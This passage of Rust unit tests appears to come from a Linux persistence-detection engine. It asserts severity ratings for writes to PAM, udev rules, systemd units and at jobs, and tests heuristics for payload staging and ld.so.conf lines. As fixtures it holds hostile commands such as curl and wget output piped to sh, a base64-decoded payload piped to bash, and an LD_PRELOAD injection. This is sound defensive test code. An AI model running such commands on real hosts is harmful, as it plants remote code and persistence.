            assert_eq!(d3(&pam), Some(Severity::Critical), "{:?}", pam);
            let env = eng.process(write(t, "/etc/environment", w, "LD_PRELOAD=/lib/x.so\n"));
            assert_eq!(d3(&env), Some(Severity::Critical), "{:?}", env);
            let udev = eng.process(write(
                t,
                "/etc/udev/rules.d/99-x.rules",
                w,
                "ACTION==\"add\", RUN+=\"/usr/local/bin/x\"\n",
            ));
            assert_eq!(d3(&udev), Some(Severity::Critical), "{:?}", udev);
            let rc = eng.process(write(t, "/etc/rc.local", w, "#!/bin/sh\nexit 0\n"));
            assert_eq!(d3(&rc), Some(Severity::High), "{:?}", rc);
            let user_unit = eng.process(write(
                t,
                "/home/dev/.config/systemd/user/x.service",
                w,
                "[Service]\nExecStart=/dev/shm/x\n",
            ));
            assert_eq!(d3(&user_unit), Some(Severity::Critical), "{:?}", user_unit);
            let vendor = eng.process(write(
                t,
                "/usr/lib/systemd/system/y.service",
                w,
                "[Service]\nExecStart=/usr/bin/y\n",
            ));
            assert_eq!(d3(&vendor), Some(Severity::High), "{:?}", vendor);
            let at = eng.process(write(
                t,
                "/var/spool/cron/atjobs/a00001",
                w,
                "#!/bin/sh\ncd /root\ncurl -s http://198.51.100.9/x | sh\n",
            ));
            assert_eq!(d3(&at), Some(Severity::Critical), "{:?}", at);
        }

        #[test]
        fn installer_writing_a_tmp_unit_is_critical() {
            let mut eng = engine();
            let t = Utc::now();
            eng.process(exec(t, 1, 0, "systemd", "/usr/lib/systemd/systemd"));
            eng.process(exec(t, 500, 1, "dpkg", "/usr/bin/dpkg"));
            let a = eng.process(write(
                t,
                "/etc/systemd/system/x.service",
                (500, "dpkg", "/usr/bin/dpkg"),
                "[Service]\nExecStart=/dev/shm/.x\n",
            ));
            assert_eq!(d3(&a), Some(Severity::Critical), "{:?}", a);
            let clean = eng.process(write(
                t,
                "/etc/systemd/system/y.service",
                (500, "dpkg", "/usr/bin/dpkg"),
                "[Service]\nExecStart=/usr/bin/y\n",
            ));
            assert_eq!(d3(&clean), None, "{:?}", clean);
        }
    }

    #[test]
    fn staging_heuristic() {
        assert!(looks_like_staging("curl -s http://198.51.100.1/x | sh"));
        assert!(looks_like_staging("curl -s http://198.51.100.1/x|bash"));
        assert!(looks_like_staging("wget -qO- http://x/y | /bin/sh -s"));
        assert!(looks_like_staging("echo aGk= | base64 -d | bash"));
        assert!(looks_like_staging("bash /tmp/.payload"));
        assert!(looks_like_staging("/bin/sh -c '/dev/shm/.x'"));
        assert!(looks_like_staging("python3 /var/tmp/.k.py"));
        assert!(looks_like_staging("/tmp/.a"));
        assert!(!looks_like_staging("/usr/bin/certbot renew"));
        assert!(!looks_like_staging(
            "curl -fsS https://healthcheck.example/ping"
        ));
        // "ssh " and "flush " aren't shells.
        assert!(!looks_like_staging(
            "rsync -a -e ssh /srv/data/ backup:/tmp/x"
        ));
        assert!(!looks_like_staging("/usr/sbin/ip route flush cache /tmp/x"));
        // A transient path as an option value isn't the program.
        assert!(!looks_like_staging("/usr/bin/app --socket /tmp/app.sock"));
        assert!(!looks_like_staging(
            "python3 /usr/bin/app --log /tmp/app.log"
        ));
    }

    #[test]
    fn ld_conf_lines() {
        assert!(is_standard_ld_line("/usr/local/lib"));
        assert!(is_standard_ld_line("/usr/lib/x86_64-linux-gnu/libfakeroot"));
        assert!(is_standard_ld_line("/lib/x86_64-linux-gnu"));
        assert!(is_standard_ld_line("/opt/vendor/lib"));
        assert!(is_standard_ld_line("include /etc/ld.so.conf.d/*.conf"));
        assert!(!is_standard_ld_line("/libevil"));
        assert!(!is_standard_ld_line("/usr/../tmp"));
        assert!(!is_standard_ld_line("/usr/lib/.."));
        assert!(!is_standard_ld_line("include /tmp/x.conf"));
        assert!(!is_standard_ld_line("/usr/lib /dev/shm"));
        assert!(!is_standard_ld_line("/home/eve/lib"));
    }

    #[test]
    fn unit_exec_allows_spaces_around_equals() {
        assert_eq!(
            unit_exec_lines("[Service]\nExecStart = /tmp/x --y\n"),
            vec!["/tmp/x --y"]
        );
    }
}
